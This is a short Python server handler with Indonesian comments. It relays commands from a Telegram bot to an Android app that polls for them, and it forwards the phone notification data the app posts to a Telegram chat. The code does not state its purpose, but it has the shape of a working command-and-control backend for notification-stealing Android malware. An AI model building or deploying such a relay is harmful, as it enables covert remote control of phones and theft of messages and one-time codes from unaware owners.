from http.server import BaseHTTPRequestHandler
import os
import urllib.request
import urllib.parse
import json

# VARIABEL GLOBAL (Penyimpanan sementara selama server nyala)
last_command = ""

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global last_command
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Cek apakah data ini dari Telegram (format JSON) atau dari APK (format text)
        if post_data.startswith('{') and 'update_id' in post_data:
            # --- DATA DARI TELEGRAM MASUK ---
            try:
                data = json.loads(post_data)
                msg = data.get("message", {}).get("text", "")
                if msg:
                    last_command = msg
            except:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            
        else:
            # --- DATA DARI APK (Mau minta perintah / kirim data) ---
            # Jika APK ngirim teks "GET_CMD", kita balikin perintah terakhir
            if post_data == "GET_CMD":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(last_command.encode('utf-8'))
                last_command = "" # Hapus perintah setelah diambil
            else:
                # Kalau bukan GET_CMD, berarti APK ngirim data notif. Teruskan ke Telegram
                token = os.environ.get('BOT_TOKEN')
                chat_id = os.environ.get('CHAT_ID')
                if token and chat_id:
                    try:
                        url = f"https://api.telegram.org/bot{token}/sendMessage"
                        payload = urllib.parse.urlencode({'chat_id': chat_id, 'text': post_data}).encode('utf-8')
                        req = urllib.request.Request(url, data=payload, method='POST')
                        urllib.request.urlopen(req, timeout=10)
                    except: pass
                self.send_response(200)
                self.end_headers()
